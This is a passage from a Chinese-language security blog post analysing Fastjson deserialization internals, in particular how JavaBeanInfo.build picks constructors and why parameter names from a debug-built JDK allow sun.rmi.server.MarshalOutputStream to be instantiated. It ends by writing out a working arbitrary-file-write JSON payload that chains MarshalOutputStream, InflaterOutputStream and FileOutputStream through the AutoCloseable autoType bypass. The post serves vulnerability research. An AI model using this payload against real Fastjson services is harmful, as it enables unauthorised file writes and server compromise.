com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:395)</span><br><span class="line">    at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:565)</span><br><span class="line">    at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1401)</span><br><span class="line">    at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1367)</span><br><span class="line">    at com.alibaba.fastjson.JSON.parse(JSON.java:183)</span><br><span class="line">    at com.alibaba.fastjson.JSON.parse(JSON.java:193)</span><br><span class="line">    at com.alibaba.fastjson.JSON.parse(JSON.java:149)</span><br><span class="line">    at Main.main(Main.java:68)</span><br></pre></td></tr></table></figure></div>

<p>上述报错的意思是 FastJson 找不到 <code>class sun.rmi.server.MarshalOutputStream</code> 的默认构造函数。具体原因需要我们分析 <code>createJavaBeanDeserializer</code> 创建 <code>JavaBeanDeserializer</code> 的过程。</p>
<p>首先 <code>createJavaBeanDeserializer</code> 决定这个 <code>clazz</code> 用哪种方式反序列化，并最终创建一个 <code>ObjectDeserializer</code> 实例给后续解析器使用。它会在<strong>高速的 ASM 反序列化器</strong>与<strong>通用的反射版 JavaBeanDeserializer</strong>之间做出选择。</p>
<ol>
<li><p><strong>初始开关</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">asmEnable</span> <span class="operator">=</span> <span class="built_in">this</span>.asmEnable &amp; !<span class="built_in">this</span>.fieldBased;</span><br></pre></td></tr></table></figure></div>

<p>若全局允许 ASM 且不是 fieldBased，才考虑 ASM。</p>
</li>
<li><p><strong>@JSONType 处理（可短路到自定义反序列化器）</strong></p>
<ul>
<li>若类上有 <code>@JSONType</code> 且 <code>deserializer()</code> 指定了类，实例化后<strong>直接返回</strong>该反序列化器。</li>
<li>否则用 <code>jsonType.asm()</code> 调整 <code>asmEnable</code>。</li>
</ul>
</li>
<li><p><strong>父类可见性检查（逐级必须 public）</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; superClass = JavaBeanInfo.getBuilderClass(clazz, jsonType);</span><br><span class="line"><span class="keyword">if</span> (superClass == <span class="literal">null</span>) superClass = clazz;</span><br><span class="line"><span class="comment">// 沿父类链检查是否都是 public</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>其他早期硬性检查</strong></p>
<ul>
<li><strong>存在泛型形参</strong> → 关掉 ASM：<code>clazz.getTypeParameters().length != 0</code></li>
<li><strong>外部类加载器</strong> → 关掉 ASM：<code>asmFactory.classLoader.isExternalClass(clazz)</code></li>
<li><strong>类名合法性</strong> → <code>ASMUtils.checkName(clazz.getSimpleName())</code></li>
</ul>
</li>
<li><p><strong>接口直接否决 ASM</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz.isInterface()) asmEnable = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>[第一次 build] —— ASM “预检版”元信息</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JavaBeanInfo</span> <span class="variable">beanInfo</span> <span class="operator">=</span> JavaBeanInfo.build(</span><br><span class="line">    clazz, type, propertyNamingStrategy,</span><br><span class="line">    <span class="literal">false</span>,                         <span class="comment">// fieldBased</span></span><br><span class="line">    TypeUtils.compatibleWithJavaBean,</span><br><span class="line">    jacksonCompatible              <span class="comment">// 这里把 ParserConfig 的 jackson 兼容开关也带进去了</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<p><strong>用途</strong>：拿到<strong>属性清单与构造元信息</strong>，以便做下一组<strong>依赖元信息</strong>的可行性检查（否则仅凭 <code>Class</code> 本身拿不到这些细节）。</p>
<p>预检里用到的 <code>beanInfo</code> 字段包括：</p>
<ul>
<li><p><code>beanInfo.fields.length</code>（&gt;200 直接弃用 ASM）</p>
</li>
<li><p><code>beanInfo.defaultConstructor</code>（<strong>没有无参构造</strong>就弃用 ASM）</p>
</li>
<li><p>遍历 <code>beanInfo.fields</code> 做逐项检查：</p>
<ul>
<li><p><code>fieldInfo.getOnly</code>（只有 getter 的只读属性 → 弃用 ASM）</p>
</li>
<li><p><code>fieldInfo.fieldClass</code> 必须 <code>public</code></p>
</li>
<li><p>成员类必须是 <code>static</code></p>
</li>
<li><p>成员名&#x2F;方法名需通过 <code>ASMUtils.checkName(...)</code></p>
</li>
<li><p><code>@JSONField</code> 包含 <code>format/deserializeUsing/parseFeatures/unwrapped</code> → <strong>退避 ASM</strong></p>
</li>
<li><p>方法型属性若 <code>paramTypes.length &gt; 1</code> → <strong>退避 ASM</strong></p>
</li>
<li><p><code>enum</code> 字段要求其反序列化器是 <code>EnumDeserializer</code> 等</p>
</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>关键点</strong>：这里<strong>没有 try&#x2F;catch</strong>。如果 <code>build(...)</code> 本身在分析构造方式时抛异常（例如“找不到默认构造且也找不到可用的创建者”），<strong>程序会直接终止</strong>，不会进入后面的“回退到反射版”。你看到的<br><code>JSONException: default constructor not found. class sun.rmi.server.MarshalOutputStream</code><br>就是 <strong>第一次 build</strong> 阶段抛出来的。</p>
</blockquote>
</li>
<li><p><strong>后置的纯类级别检查</strong>（不依赖 <code>beanInfo</code>）</p>
<ul>
<li>非静态内部类本体 → 关掉 ASM</li>
<li><code>TypeUtils.isXmlField(clazz)</code> → 关掉 ASM</li>
</ul>
</li>
<li><p><strong>若走不了 ASM → 直接返回反射版</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!asmEnable) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JavaBeanDeserializer</span>(<span class="built_in">this</span>, clazz, type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>（注意：上面第 6 步<strong>如果 build 就抛异常</strong>，压根到不了这里。）</p>
</li>
<li><p><strong>[第二次 build] —— ASM 生成用的“最终版”元信息</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JavaBeanInfo</span> <span class="variable">beanInfo</span> <span class="operator">=</span> JavaBeanInfo.build(clazz, type, propertyNamingStrategy);</span><br></pre></td></tr></table></figure></div>

<ul>
<li>这是另一个重载，等价于：<code>fieldBased=false</code>、<code>compatibleWithJavaBean=TypeUtils.compatibleWithJavaBean</code>、**<code>jacksonCompatible=false</code>**（默认）。</li>
<li>也就是说，<strong>预检</strong>那次 <code>build(...)</code> 会考虑 <code>jacksonCompatible</code>，但<strong>真正用于 ASM 代码生成</strong>的这次 <code>build(...)</code> <strong>不再启用 jackson 兼容路径</strong>。</li>
<li>原因很简单：ASM 路线只支持“<strong>无参构造 + setter&#x2F;字段写入</strong>”这一套纯 JavaBean 语义；Jackson 风格的 Creator&#x2F;Factory 并不会用于 ASM 代码生成。</li>
</ul>
</li>
<li><p><strong>尝试用 ASM 工厂生成专用反序列化器</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> asmFactory.createJavaBeanDeserializer(<span class="built_in">this</span>, beanInfo);</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JavaBeanDeserializer</span>(<span class="built_in">this</span>, clazz, type);</span><br><span class="line">&#125; <span class="keyword">catch</span> (JSONException asmError) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JavaBeanDeserializer</span>(<span class="built_in">this</span>, beanInfo);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;create asm deserializer error, &quot;</span> + clazz.getName(), e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>这里<strong>有</strong>兜底：ASM 生成失败时回退到反射版（有时带 <code>clazz,type</code>，有时直接复用刚才的 <code>beanInfo</code>）。</li>
<li>但再次强调：<strong>这只兜 ASM 工厂阶段的错</strong>；<strong>不兜第一次 build 抛出的错</strong>。</li>
</ul>
</li>
</ol>
<p><code>JavaBeanInfo.build</code> <strong>决定“怎么 new 出对象 + 怎么把 JSON 的 key 对应到属性&#x2F;参数”</strong>，并把这些决策以 <code>JavaBeanInfo</code> 形式交给上层。</p>
<p>简而言之就是<strong>全面扫描类的“可反序列化入口”</strong>：优先级大致是<br>Builder &#x2F; <code>@JSONCreator</code> 构造器 &#x2F; <code>@JSONCreator</code> 工厂方法 &#x2F;（Kotlin 特殊）&#x2F; <strong>有参数构造器（能拿到参数名）</strong> &#x2F; <strong>默认构造器</strong> + Setter&#x2F;字段 映射。</p>
<p>其中关键步骤为：</p>
<ol>
<li><p><strong>拿注解与命名策略</strong>：读 <code>@JSONType</code>，可能覆盖 <code>PropertyNamingStrategy</code>。</p>
</li>
<li><p><strong>Builder 支持</strong>：如果声明了 Builder 类（<code>getBuilderClass</code>），就转到 Builder 的 setter（<code>withXxx</code>&#x2F;<code>setXxx</code>），再找 <code>build()</code>&#x2F;<code>create()</code> 之类的构建方法。</p>
</li>
<li><p><strong>收集类信息</strong>：字段、方法、泛型映射、是否 Kotlin、全部构造器等。</p>
</li>
<li><p><strong>找默认构造器</strong>：</p>
<ul>
<li>若不是 Kotlin（或只有一个构造器），优先在 <strong>目标类或其 Builder</strong> 上找 <strong>无参构造器</strong>（<code>getDefaultConstructor</code>），并 <code>setAccessible</code>。</li>
</ul>
</li>
<li><p><strong>如果（没有默认构造器 &amp;&amp; 也没有 Builder）或类是接口&#x2F;抽象</strong>：</p>
<ul>
<li><p><strong>尝试 <code>@JSONCreator</code> 标注的构造器</strong>：通过参数上的 <code>@JSONField(name=...)</code> 映射 JSON 属性→参数。</p>
</li>
<li><p><strong>否则尝试 <code>@JSONCreator</code> 的工厂方法</strong>（<code>static</code> 或兼容 Jackson Creator）。</p>
</li>
<li><p><strong>否则（常规 POJO）尝试“有参构造器 + 参数名”路径</strong>：</p>
<ul>
<li>逐个枚举 <code>public</code> 构造器，<strong>用 <code>ASMUtils.lookupParameterNames(constructor)</code> 取参数名</strong>（或 Kotlin 的参数名）。</li>
<li>能拿到参数名，就据此把每个参数包装成 <code>FieldInfo</code>（参数名&#x3D;属性名，或受 <code>@JSONField</code> 覆盖）。</li>
<li><strong>若找到此路可行，返回 <code>JavaBeanInfo</code>，并把 <code>creatorConstructor</code> 设为该构造器。</strong></li>
</ul>
</li>
<li><p><strong>都不行</strong>：抛出 <code>JSONException(&quot;default constructor not found. &quot; + clazz)</code> —— 因为没有默认构造器、也没有任何“可用的对象创建入口”（Creator&#x2F;Factory&#x2F;Builder&#x2F;有参构造器+参数名）。</p>
</li>
</ul>
</li>
<li><p><strong>如果有默认构造器</strong>：</p>
<ul>
<li>走常规 JavaBean 路径：扫描 <strong>setter 方法</strong> &#x2F; <strong>字段</strong> &#x2F; <strong>集合 Map 的 getter</strong> 等，合成 <code>FieldInfo</code> 列表；也支持 <code>@JSONField</code> 覆盖属性名、序列化&#x2F;解析特性；支持命名策略转换等。</li>
</ul>
</li>
<li><p><strong>字段为 0 的兜底（XML&#x2F;fieldBased）</strong>：可能改走“基于字段”的映射。</p>
</li>
<li><p><strong>最终</strong>：返回 <code>JavaBeanInfo(clazz, builderClass, defaultConstructor, creatorConstructor, factoryMethod, buildMethod, jsonType, fieldList)</code>。</p>
</li>
</ol>
<p>对于普通的 JDK，通过下面这条命令查询 <code>sun.rmi.server.MarshalOutputStream</code> 的函数信息：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javap -l sun.rmi.server.MarshalOutputStream</span><br></pre></td></tr></table></figure></div>

<p>发现构造函数只有下面两种，并且<strong>没有无参构造器</strong>。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public sun.rmi.server.MarshalOutputStream(java.io.OutputStream) throws java.io.IOException;</span><br><span class="line">  LineNumberTable:</span><br><span class="line">    line 55: 0</span><br><span class="line">    line 56: 6</span><br><span class="line"></span><br><span class="line">public sun.rmi.server.MarshalOutputStream(java.io.OutputStream, int) throws java.io.IOException;</span><br><span class="line">  LineNumberTable:</span><br><span class="line">    line 64: 0</span><br><span class="line">    line 65: 5</span><br><span class="line">    line 66: 10</span><br><span class="line">    line 73: 22</span><br></pre></td></tr></table></figure></div>

<p>因此根据前面对 <code>JavaBeanInfo.build</code> 的分析，此时会<strong>用 <code>ASMUtils.lookupParameterNames(constructor)</code> 取参数名</strong>，试图走“<strong>有参构造器 + 参数名</strong>”分支。</p>
<p>然而 <strong>JDK 类通常不携带参数名</strong>（没有 <code>-parameters</code>，也通常不保留 <code>LocalVariableTable</code> 参数名），因此 <code>ASMUtils.lookupParameterNames(constructor)</code> <strong>拿不到名字</strong>，直接 <code>continue</code>。最终因为<strong>没有找到任何可用的构造路径</strong>而抛出：<code>default constructor not found. class sun.rmi.server.MarshalOutputStream</code> 错误。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">String[] paramNames = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (kotlin &amp;&amp; constructors.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Constructor constructor : constructors) &#123;</span><br><span class="line">        Class&lt;?&gt;[] parameterTypes = constructor.getParameterTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">is_public</span> <span class="operator">=</span> (constructor.getModifiers() &amp; Modifier.PUBLIC) != <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (!is_public) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// lookupParameterNames == [] =&gt; paramNames == null</span></span><br><span class="line">        String[] lookupParameterNames = ASMUtils.lookupParameterNames(constructor);</span><br><span class="line">        <span class="keyword">if</span> (lookupParameterNames == <span class="literal">null</span> || lookupParameterNames.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (creatorConstructor != <span class="literal">null</span></span><br><span class="line">                &amp;&amp; paramNames != <span class="literal">null</span> &amp;&amp; lookupParameterNames.length &lt;= paramNames.length) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        paramNames = lookupParameterNames;</span><br><span class="line">        creatorConstructor = constructor;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (paramNames != <span class="literal">null</span></span><br><span class="line">        &amp;&amp; types.length == paramNames.length) &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;default constructor not found. &quot;</span> + clazz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然而如果是我们自己编译的带符号的 JDK：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/openjdk/jdk8u &amp;&amp; <span class="built_in">cd</span> jdk8u</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get update</span><br><span class="line"><span class="built_in">sudo</span> apt-get install xorg-dev libcups2-dev libasound2-dev</span><br><span class="line"></span><br><span class="line">git checkout jdk8u392-b08</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新配置</span></span><br><span class="line">bash configure \</span><br><span class="line">  --with-debug-level=slowdebug \</span><br><span class="line">  --with-extra-cxxflags=<span class="string">&#x27;-std=gnu++98 -Wno-register -Wno-error=register&#x27;</span> \</span><br><span class="line">  --with-extra-cflags=<span class="string">&#x27;-Wno-error=register&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">make images WARNINGS_ARE_ERRORS=</span><br></pre></td></tr></table></figure></div>

<p>那么 <code>javap -l sun.rmi.server.MarshalOutputStream</code> 发现 <code>MarshalOutputStream</code> 的构造函数的参数有 <code>LocalVariableTable</code> 信息，那么 <code>ASMUtils.lookupParameterNames</code> 也就可以正常获取有参构造函数了。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> sun.rmi.server.MarshalOutputStream(java.io.OutputStream) <span class="keyword">throws</span> java.io.IOException;</span><br><span class="line">  LineNumberTable:</span><br><span class="line">    line <span class="number">55</span>: <span class="number">0</span></span><br><span class="line">    line <span class="number">56</span>: <span class="number">6</span></span><br><span class="line">  LocalVariableTable:</span><br><span class="line">    Start  Length  Slot  Name   Signature</span><br><span class="line">        <span class="number">0</span>       <span class="number">7</span>     <span class="number">0</span>  <span class="built_in">this</span>   Lsun/rmi/server/MarshalOutputStream;</span><br><span class="line">        <span class="number">0</span>       <span class="number">7</span>     <span class="number">1</span>   out   Ljava/io/OutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> sun.rmi.server.MarshalOutputStream(java.io.OutputStream, <span class="type">int</span>) <span class="keyword">throws</span> java.io.IOException;</span><br><span class="line">  LineNumberTable:</span><br><span class="line">    line <span class="number">64</span>: <span class="number">0</span></span><br><span class="line">    line <span class="number">65</span>: <span class="number">5</span></span><br><span class="line">    line <span class="number">66</span>: <span class="number">10</span></span><br><span class="line">    line <span class="number">73</span>: <span class="number">22</span></span><br><span class="line">  LocalVariableTable:</span><br><span class="line">    Start  Length  Slot  Name   Signature</span><br><span class="line">        <span class="number">0</span>      <span class="number">23</span>     <span class="number">0</span>  <span class="built_in">this</span>   Lsun/rmi/server/MarshalOutputStream;</span><br><span class="line">        <span class="number">0</span>      <span class="number">23</span>     <span class="number">1</span>   out   Ljava/io/OutputStream;</span><br><span class="line">        <span class="number">0</span>      <span class="number">23</span>     <span class="number">2</span> protocolVersion   I</span><br></pre></td></tr></table></figure></div>

<p>如果 json 后续的属性与构造函数的参数名对应上（例如 <code>sun.rmi.server.MarshalOutputStream(out, protocolVersion)</code>）：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;protocolVersion&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>那么随后我们就可以调用到对应的构造函数将 <code>MarshalOutputStream</code> 实例化。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">at sun.rmi.server.MarshalOutputStream.&lt;init&gt;(MarshalOutputStream.java:64)</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance0(NativeConstructorAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)</span><br><span class="line">at java.lang.reflect.Constructor.newInstance(Constructor.java:423)</span><br><span class="line">at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:1012)</span><br><span class="line">at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:288)</span><br><span class="line">at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:284)</span><br><span class="line">at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:808)</span><br><span class="line">at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:288)</span><br><span class="line">at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:284)</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:395)</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1401)</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1367)</span><br><span class="line">at com.alibaba.fastjson.JSON.parse(JSON.java:183)</span><br><span class="line">at com.alibaba.fastjson.JSON.parse(JSON.java:193)</span><br><span class="line">at com.alibaba.fastjson.JSON.parse(JSON.java:149)</span><br><span class="line">at Main.main(Main.java:55)</span><br></pre></td></tr></table></figure></div>

<p>在上述分析的基础上，我们可以构造出下面这个任意文件写的 payload：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.util.zip.InflaterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">           <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.FileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/asdasd&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;infl&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">           <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eJxLLE5JTCkGAAh5AnE=&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;bufLen&quot;</span><span class="punctuation">:</span> <span class="number">100</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;protocolVersion&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>首先最内层是一个 <code>java.io.FileOutputStream</code> 类的实例。由于我们使用的 JDK 带参数符号，因此可以通过：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.FileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/asdasd&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>并且 <code>FileOutputStream</code> 继承于 <code>AutoCloseable</code>，可以通过 <code>checkAutoType</code> 的检查。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/09/09/Java%20FastJson/images/FileOutputStream.png"
                      alt="FileOutputStream"
                ></p>
<p>直接定位到 <code>java.io.FileOutputStream</code> 对应的构造函数并调用：</p>
